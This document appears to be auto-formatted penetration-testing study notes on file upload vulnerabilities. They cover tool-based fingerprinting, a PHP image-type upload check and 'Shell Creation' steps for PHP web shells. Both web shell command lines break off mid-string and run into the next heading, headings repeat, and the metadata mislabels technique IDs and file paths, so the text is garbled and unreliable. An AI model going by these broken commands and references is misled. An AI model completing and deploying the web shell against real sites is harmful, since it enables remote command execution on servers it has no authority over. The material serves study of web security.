---
title: file uploads
aliases: []
tags:
- topic/file-uploads
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: file-uploads.md
related_tools:
- '[[burpsuite]]'
- '[[fierce]]'
- '[[ffuf]]'
- '[[masscan]]'
- '[[msfvenom]]'
- '[[phpbash]]'
- '[[wappalyzer]]'
related_techniques:
- '[[t1132-001]]'
- '[[t1555-004]]'
related_tactics:
- '[[t1003-003]]'
related_services:
- '[[http]]'
- '[[https]]'
related_os:
- '[[/opt/useful/seclists/Web-Shells]]'
- '[[/etc/apache2/mods-enabled/php7.4.conf]]'
- '[[shell.gif]]'
- '[[profile.png]]'
- '[[shell-php]]'
- '[[misshell.jpg]]'
- '[[php.lst]]'
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# file uploads

## File Uploads
## File Uploads
- **Unauthenticated Arbitrary File Upload**: Any unauthenticated user can upload any file type.

- **Identify Language/Framework**:
  - Use `fuff` with the list from `https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt`.
  - Manually check as well.
  - Use `wappalyzer` for identifying the language/framework.

- **Webshell**:
  - **PHP**:
    - `echo '<?php system($_REQUEST[

## Description
The provided code snippet checks if the uploaded file type is an image and rejects non-image files. If the file type is not an image, it outputs 'Only images are allowed' and terminates the script.

## Code Snippet
```php
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo 'Only images are allowed';
    die();
}
```

## Shell Creation
Several methods to create a PHP shell are provided:

- **Profile Picture Shell**
  ```bash
  curl "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQIf4R5qPKHPNMyAqV-FjS_OTBB8pfUV29Phg&s" -o profile.png
  ```

- **Quick Shell**
  ```bash
  echo '<?php system($_REQUEST[

## References
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

